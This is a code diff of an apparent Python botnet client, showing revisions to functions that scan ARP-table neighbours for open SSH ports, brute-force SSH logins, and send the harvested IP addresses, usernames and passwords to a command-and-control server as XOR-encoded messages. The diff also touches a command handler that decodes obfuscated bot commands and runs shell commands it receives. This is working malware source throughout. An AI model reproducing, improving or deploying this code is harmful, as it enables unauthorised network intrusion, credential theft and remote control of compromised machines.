@@ -59,6 +59,7 @@ def arp_table_snoop():#sends arp table form bots' host's arp table
 			for line in arp_table:
 				ip_addr = ''
 				port_22_fb = ''
+				port_22_fb_enc = ''
 				if counter >= 1:
 					line_words = line.split()
 					ip_addr = line_words[0]
@@ -67,26 +68,23 @@ def arp_table_snoop():#sends arp table form bots' host's arp table
 						s.connect((ip_addr, int(22)))
 					except:
 						pass
-						#print("\t Closed and lights out at port 22 on host " + ip_addr)
 					else:
 						port_22_fb += "### "+ip_addr+" has port 22 open"
 						port_22_fb_enc = (xor_enc(port_22_fb,key).encode())#encoding message to send back to cnc
 						s.close()
-						#print("\t Someone is home. Do we have a key for port 22 at " + ip_addr + "?")
 				try:
-					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-					s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-					s.settimeout(1)
-					s.connect((str(cnc),int(fb_port)))
-					s.send(port_22_fb_enc)
-					s.close()
+					if port_22_fb_enc != '':
+                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+                                                s.settimeout(1)
+                                                s.connect((str(cnc),int(fb_port)))
+                                                s.send(port_22_fb_enc)
+                                                s.close()
 				except:
 					pass
 
 				counter += 1
-			#for i in ip_addr_22_open:
-				#print(i)
-		break
+			break
 
 def brute_force_ssh(ip,username,t_out):#brute force attack on port 22 
 	global stop
@@ -102,22 +100,26 @@ def brute_force_ssh(ip,username,t_out):#brute force attack on port 22
 		except:
 			pass
 		else:
-			bf_results = ''
-			line_parse = []
 			with open('/tmp/.bfssh_results', 'r') as file:
 				for line in file:
-					line_parse = line.split(" ")
+					bf_results = ''
+                                        bf_results_clean = ''
+                                        bf_results_enc = ''
+                                        line_parse = []
+                                        line_parse = line.split(" ")
 					if len(line_parse) >= 10:
 						if line_parse[9] == "password:":
 							bf_results = "$$$ ip_addr: "+line_parse[2]+' tcp_port: 22, username: '+line_parse[6]+', password: '+line_parse[10] 
-							bf_results_enc = (xor_enc(bf_results,key).encode())#encoding message to send back to cnc
+							bf_results_clean = bf_results.rstrip()
+							bf_results_enc = (xor_enc(bf_results_clean,key).encode())#encoding message to send back to cnc
 							try:
-								s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-								s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-								s.settimeout(1)
-								s.connect((str(cnc),int(fb_port)))
-								s.send(bf_results_enc)
-								s.close()
+								if bf_results_enc != '':
+                                                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                                                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+                                                                        s.settimeout(1)
+                                                                        s.connect((str(cnc),int(fb_port)))
+                                                                        s.send(bf_results_enc)
+                                                                        s.close()
 							except:
 								pass
 			subprocess.run(['rm', '-rf','/tmp/.bfssh_results'])
@@ -182,7 +184,7 @@ def handle(sock):
 						attack=0
 					stop = False
 					for _ in range(int(1)):
-						p = threading.Thread(target=brute_force_ssh, args =(command[1],command[2],command[3])) #!bf_ssh <ip> <username> <timeout in seconds>
+						p = threading.Thread(target=brute_force_ssh, args =(command[1],command[2],command[3]))#!bf_ssh <ip> <username> <timeout in seconds>
 						p.start()
 					attack+=1
 				elif command[0] == xor_dec('QAAKCQgY',key):#encoded keyword: !snoop
@@ -202,16 +204,16 @@ def handle(sock):
 					p= threading.Thread(target=shell_exec, args = (data[5:], sock))
 					p.start()
 					attack+=1
-				elif command[0] == xor_dec('QAAHBwk=',key):
+				elif command[0] == xor_dec('QAAHBwk=',key):#encoded keyword: !scan
 					global scan
 					if command[1] == "1":
 						scan = True
 					if command[1] == "0":
 						scan = False
-				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
+				elif command[0] == xor_dec('QAAQCRc=',key):#encoded keyword:!stop
 					stop = True
 					attack = 0#clear attack list
-				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
+				elif command[0] == xor_dec('QBgNCgs=',key):#encoded keyword: !kill : kill bot
 					sock.close()
 					return 1
 			except:#if have error than will pass
